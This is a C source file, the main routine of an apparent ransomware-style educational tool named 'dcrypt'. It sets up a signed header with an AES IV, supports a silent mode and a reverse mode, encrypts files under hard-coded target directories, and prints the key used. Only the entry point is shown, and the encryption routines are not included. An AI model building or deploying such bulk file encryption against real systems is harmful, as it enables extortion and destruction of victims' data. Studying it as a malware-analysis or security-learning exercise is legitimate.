#include "dcrypt.h"

void init_dcrypt_header(t_env *env)
{
	// Set the file signature
	memcpy(env->dcrypt_header.signature, DC_SIGNATURE, DC_MAGICNBR_SIZE);
	// Set the size of the encrypted AES key
	env->dcrypt_header.encrypted_iv_len = DC_ENCRYPTED_IV_SIZE;
	// Get the encryption key that will be used to encrypt/decrypt
	const unsigned char *encryption_key = get_encryption_key(env);
	if (!encryption_key) {
		if (env->modes & DC_VERBOSE)
			fprintf(
				stderr,
				FMT_ERROR "Failed to get the encryption key. Aborting...\n"
			);
		exit(EXIT_FAILURE);
	}

	/*
	 * In encryption mode, generate the IV used by AES encryption.
	 * The IV will be saved inside the custom header on the encrypted file.
	 */

	if (!(env->modes & DC_REVERSE)) {
		unsigned char	*iv_key = keygen(DC_KEYCHARSET, DC_AES_KEY_SIZE);

		// Copy the IV key to the custom header
		memcpy(env->dcrypt_header.iv_key, iv_key, DC_AES_KEY_SIZE);

		free(iv_key);
	}
}

void print_results(t_env *env)
{
	printf(
		"\n=======================================\n"
		FMT_INFO
		"Successfully processed %ld files.\n",
		env->handled_file_count
	);

	printf(
		FMT_INFO
		"Used key: %s\n",
		env->modes & DC_REVERSE ? env->decryption_key : env->encryption_key
	);
}

int main(int argc, char *argv[])
{
	static t_env	env;

	// Detect first silent mode
	detect_silent_mode(&env, argc, argv);

	// Parse the arguments given through the commannd line
	parse_argv(&env, argc, argv);

	// Init the header that will be placed at the top of the file
	init_dcrypt_header(&env);

	// Declare the injection target directory paths
	char *target_dir_paths[DC_TARGET_ARRAY_SIZE] = DC_TARGET_PATHS;

	// Open each target directory one by one
	for (size_t i = 0; i < DC_TARGET_ARRAY_SIZE; ++i) {
		handle_dir(&env, target_dir_paths[i]);
	}

	print_results(&env);

	// Free the key if memory has been allocated
	if (env.key_allocated)
	{
		free((void *)env.encryption_key);
		env.encryption_key = NULL;
	}
}
